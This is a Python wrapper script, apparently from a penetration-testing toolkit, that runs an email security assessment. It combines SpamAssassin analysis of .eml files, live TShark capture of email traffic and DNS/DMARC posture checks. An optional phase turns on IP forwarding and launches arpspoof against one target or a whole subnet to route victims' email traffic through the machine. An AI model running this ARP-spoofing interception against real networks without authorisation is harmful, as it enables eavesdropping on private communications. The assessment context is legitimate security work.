import os
import sys
import time
import subprocess
from datetime import datetime

def log(msg, level="INFO"):
    colors = {
        "INFO": "\033[94m",   # Blue
        "SUCCESS": "\033[92m",# Green
        "WARN": "\033[93m",   # Yellow
        "ERROR": "\033[91m",  # Red
        "RESET": "\033[0m"    # Reset
    }
    color = colors.get(level, colors["INFO"])
    print(f"{color}[{level}] {msg}{colors['RESET']}")

def setup_output_dir(org_name):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    base_out_dir = os.path.abspath(os.path.join(script_dir, "output", org_name, "out_email_flow"))
    os.makedirs(base_out_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = os.path.join(base_out_dir, f"email_flow_logs_{timestamp}")
    try:
        os.makedirs(out_dir, exist_ok=True)
        log(f"Created output directory: {out_dir}", "SUCCESS")
        return out_dir
    except Exception as e:
        log(f"Failed to create directory '{out_dir}': {e}", "ERROR")
        sys.exit(1)

def set_ip_forwarding(enable=True):
    val = "1" if enable else "0"
    state = "Enabling" if enable else "Disabling"
    log(f"{state} IP Forwarding...", "INFO")
    try:
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True, check=True)
    except Exception as e:
        log(f"Failed to set IP forwarding. Interception might drop victim's internet: {e}", "WARN")

def start_arp_spoofing(interface, gateway_ip, target_ip=""):
    procs = []
    try:
        subprocess.run(["arpspoof", "-h"], capture_output=True)
        log(f"Initiating ARP Spoofing on {interface} to intercept email traffic...", "WARN")
        
        if target_ip:
            log(f"  --> Intercepting Target: {target_ip} <--> Gateway: {gateway_ip}", "WARN")
            p1 = subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p2 = subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            procs.extend([p1, p2])
        else:
            log(f"  --> Intercepting ENTIRE SUBNET <--> Gateway: {gateway_ip}", "WARN")
            p1 = subprocess.Popen(["arpspoof", "-i", interface, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            procs.append(p1)
            
        log("ARP Spoofing is now active. Email flows routed to this machine.", "SUCCESS")
        return procs
        
    except FileNotFoundError:
        log("'arpspoof' is missing! Install via 'sudo apt install dsniff'. TShark will only log local traffic.", "ERROR")
        return []

def stop_arp_spoofing(procs):
    if procs:
        log("Stopping active interception (ARP Spoofing) and cleaning up...", "INFO")
        for p in procs:
            p.terminate()
            p.wait(timeout=5)
        log("Target traffic routing restored to normal.", "SUCCESS")


def compile_results(out_dir):
    log("Consolidating final 3-Pillar Email Security report...", "INFO")
    
    final_report = os.path.join(out_dir, "email_flow_report.txt")
    pcap_log = os.path.join(out_dir, "historical_email_flows.txt")
    sa_log = os.path.join(out_dir, "spamassassin_report.txt")
    dns_log = os.path.join(out_dir, "external_dns_posture.txt")
    
    try:
        with open(final_report, "w") as report:
            report.write("==========================================================\n")
            report.write("      FULL 3-PILLAR EMAIL SECURITY & POSTURE REPORT       \n")
            report.write("==========================================================\n\n")
            
            report.write("--- Pillar 1: Static Endpoint Content Analysis (SpamAssassin) ---\n")
            if os.path.exists(sa_log):
                with open(sa_log, "r") as f:
                    report.write(f.read() + "\n")
            else:
                report.write("No static .eml file processed for Endpoint analysis.\n\n")

            report.write("\n\n--- Pillar 2: Live Network Email Flow Interception (TShark) ---\n")
            if os.path.exists(pcap_log):
                with open(pcap_log, "r") as f:
                    report.write(f.read() + "\n")
            else:
                report.write("No live network email flows captured or analyzed.\n\n")
                
            report.write("\n\n--- Pillar 3: External Domain Security Posture (DNS Logs) ---\n")
            if os.path.exists(dns_log):
                with open(dns_log, "r") as f:
                    report.write(f.read() + "\n")
            else:
                report.write("No external domain investigated.\n")
                
        for file in [pcap_log, sa_log, dns_log]:
            if os.path.exists(file):
                os.remove(file)
                
        log(f"Final 3-Pillar Report cleanly compiled to: '{os.path.abspath(final_report)}'", "SUCCESS")
        
    except Exception as e:
        log(f"Error compiling final report: {e}", "ERROR")

def main():
    print("==========================================================")
    print("  Email Flow Monitoring & Content Analysis - Wrapper      ")
    print("==========================================================")
    
    if hasattr(os, 'geteuid') and os.geteuid() != 0:
        log("WARNING: TShark (raw socket access) and ARP Spoofing require root (sudo).", "WARN")
        time.sleep(2)
        
    arpspoof_procs = []
    is_spoofing = False
    
    try:
        org_name = input("\nEnter the organization name in which the assessment is performed: ").strip().replace(" ", "_")
        if not org_name:
            org_name = "Unknown_Org"
            
        interface = input("\nEnter interface for Live Email Flow monitoring (e.g., eth0) [default: eth0]: ").strip()
        if not interface:
            interface = "eth0"
            
        duration_input = input("Enter Flow Capture duration (minutes) [default: 5]: ").strip()
        duration_mins = int(duration_input) if duration_input.isdigit() else 5
        
        eml_file = input("Enter path to a raw email file (.eml) for Phase 1 static SpamAssassin assessment [leave blank to skip]: ").strip()
        
        target_domain = input("Enter Target Domain (e.g., company.com) to automatically assess its public DMARC/SPF Posture [leave blank to skip]: ").strip()
        
        print("\n--- Phase 0: Network Interception Setup ---")
        spoof_choice = input("Enable Active ARP Spoofing to intercept WHOLE network email traffic? (y/N): ").strip().lower()
        if spoof_choice == 'y':
            gateway_ip = input("  Enter Router/Gateway IP (e.g., 192.168.1.1): ").strip()
            target_ip = input("  Enter Target IP (leave empty to intercept ALL subnet traffic): ").strip()
            
            if gateway_ip:
                is_spoofing = True
                set_ip_forwarding(enable=True)
                arpspoof_procs = start_arp_spoofing(interface, gateway_ip, target_ip)
            else:
                log("Router/Gateway IP is absolutely required to arp spoof. Bypassing interception.", "WARN")
        
        out_dir = setup_output_dir(org_name)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        print("\n--- Pillar 1: Static Email Content Analysis ---")
        if eml_file:
            sa_script = os.path.join(script_dir, "spamassassin_scan.py")
            if os.path.exists(sa_script):
                subprocess.run([sys.executable, sa_script, "--out-dir", out_dir, "--eml-file", eml_file])
            else:
                log("spamassassin_scan.py not found.", "ERROR")
        else:
            log("No .eml file provided.", "INFO")

        print("\n--- Pillar 2: Live Network Email Monitoring ---")
        tshark_script = os.path.join(script_dir, "tshark_email_scan.py")
        if os.path.exists(tshark_script):
            subprocess.run([sys.executable, tshark_script, "--out-dir", out_dir, "--interface", interface, "--duration-mins", str(duration_mins)])
        else:
            log("tshark_email_scan.py not found.", "ERROR")

        print("\n--- Pillar 3: External Domain Asset Auditing ---")
        if target_domain:
            dns_script = os.path.join(script_dir, "dns_posture_scan.py")
            if os.path.exists(dns_script):
                subprocess.run([sys.executable, dns_script, "--out-dir", out_dir, "--domain", target_domain])
            else:
                log("dns_posture_scan.py not found.", "ERROR")
        else:
            log("No target domain provided.", "INFO")
        
        print("\n==========================================================")
        compile_results(out_dir)
        log("Log-less Assessment Suite mathematical analysis entirely completed!", "SUCCESS")
        
    except KeyboardInterrupt:
        print("\n")
        log("Email assessment purposefully interrupted by user. Exiting...", "WARN")
    finally:
        if is_spoofing:
            print("\n--- Clean-up Phase ---")
            stop_arp_spoofing(arpspoof_procs)
            set_ip_forwarding(enable=False)
            
        sys.exit(0)

if __name__ == "__main__":
    main()
